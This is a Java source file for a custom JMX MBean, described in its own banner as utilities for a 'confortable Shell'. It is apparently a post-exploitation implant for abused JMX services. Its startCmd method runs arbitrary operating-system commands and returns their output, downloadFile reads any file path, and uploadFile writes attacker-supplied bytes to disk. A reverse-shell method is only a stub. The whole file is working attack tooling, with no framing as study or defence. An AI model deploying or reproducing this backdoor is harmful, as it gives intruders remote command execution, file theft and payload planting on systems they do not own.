package fr.jrjgjk;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.lang.StringBuilder;
import java.util.Scanner;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class Scan implements ScanMBean{
	public static void main(String[] argv) {
		System.out.println("Custom MBean containing some utils functions that can be used to use a confortable Shell ;)");
	}
	
	public String startCmd(String cmd){
		StringBuilder val = new StringBuilder();
		Process proc = null;

		try{
			if(!cmd.isEmpty()){
				if(System.getProperty("os.name").startsWith("Windows")){
					proc = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
				} else {
					proc = Runtime.getRuntime().exec(cmd);
				}

			    java.io.InputStream is = proc.getInputStream();
			    Scanner s = new Scanner(is).useDelimiter("\n");
			    while (s.hasNext()) {
			        val.append(s.next()).append("\n");
			    }
			}
		} catch(java.io.IOException ex){
			return System.getProperty("user.dir") + "\n" + ex.getMessage();
		}

	    return System.getProperty("user.dir") + "\n" + val.toString();
	}
	
	public String doRevShell(String host, int port){
		return "Hey";
	}
	
	public byte[] downloadFile(String path) throws java.io.FileNotFoundException, IOException {
		byte[] bytearray = null;
		Path fileP = Paths.get(path);
		if(Files.exists(fileP)){
			bytearray = Files.readAllBytes(fileP);
		} else {
			throw new java.io.FileNotFoundException("File " + path + " not found...");
		}
		return bytearray;
	}
	
	public boolean uploadFile(byte[] fileContent, String dest) throws IOException {
		File outputFile = new File(dest);
		if(Files.exists(Paths.get(dest))){
			throw new IOException("File " + dest + " already exists, cannot override a file");
		} else if(fileContent.length == 0) {
			throw new IOException("Cannot upload an empty file");
		}
		try{
			FileOutputStream outputStream = new FileOutputStream(outputFile);
			outputStream.write(fileContent);
		} catch (Exception ex) {
			System.out.println(ex.getMessage());
			return false;
		}
		return true;
	}
}
